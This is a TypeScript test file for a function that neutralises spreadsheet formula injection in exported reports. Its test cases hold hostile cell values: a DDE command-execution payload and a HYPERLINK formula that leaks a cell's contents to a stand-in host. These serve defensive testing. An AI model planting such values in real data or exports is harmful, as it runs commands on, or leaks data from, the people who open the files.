import { describe, test, expect } from "vitest"
import { safeCellValue } from "./exportExcel"

/**
 * Formula injection in an exported workbook.
 *
 * Every value in these exports comes from a record somebody typed — customer
 * names, driver names, trip origins. A spreadsheet reads a leading =, +, - or
 * @ as the start of a formula, so a customer named `=cmd|'/c calc'!A1`
 * executes when a finance officer opens the report and clicks through Excel's
 * warning. The person who typed it never needs access to the export.
 */

describe("values that would become formulas", () => {
  test("the four leading characters a spreadsheet treats as a formula are neutralised", () => {
    expect(safeCellValue("=cmd|'/c calc'!A1")).toBe("'=cmd|'/c calc'!A1")
    expect(safeCellValue("+1+1")).toBe("'+1+1")
    expect(safeCellValue("-2+3")).toBe("'-2+3")
    expect(safeCellValue("@SUM(A1:A9)")).toBe("'@SUM(A1:A9)")
  })

  test("tab and carriage return are covered too", () => {
    // Both are treated as leading whitespace by some spreadsheets, which then
    // read what follows as a formula.
    expect(safeCellValue("\t=1+1")).toBe("'\t=1+1")
    expect(safeCellValue("\r=1+1")).toBe("'\r=1+1")
  })

  test("the real payload shape used against finance teams", () => {
    const hostile = '=HYPERLINK("http://evil.test?x="&A1,"Click")'
    expect(safeCellValue(hostile).startsWith("'")).toBe(true)
  })
})

describe("values that must not be touched", () => {
  test("ordinary text is left exactly as it is", () => {
    for (const ok of ["Ana Reyes", "Davao City", "DVO-2026-0015", "a=b", "3 + 4", ""]) {
      expect(safeCellValue(ok)).toBe(ok)
    }
  })

  test("numbers and dates stay their own types so columns still sum", () => {
    /*
     * The trap in the first attempt at this: writing the guard as a character
     * class `[=+-@]` makes `+-@` a RANGE covering digits, commas and periods,
     * which would have turned every figure into a quoted string and broken
     * every total in every export.
     */
    expect(safeCellValue(4500)).toBe(4500)
    expect(safeCellValue(0)).toBe(0)
    expect(safeCellValue(-12.5)).toBe(-12.5)
    const date = new Date("2026-09-25")
    expect(safeCellValue(date)).toBe(date)
    expect(safeCellValue(null)).toBe(null)
    expect(safeCellValue(undefined)).toBe(undefined)
    expect(safeCellValue(true)).toBe(true)
  })

  test("a number written as text keeps its digits", () => {
    expect(safeCellValue("4,500.00")).toBe("4,500.00")
    expect(safeCellValue("2026-09-25")).toBe("2026-09-25")
    expect(safeCellValue("09171234567")).toBe("09171234567")
  })
})
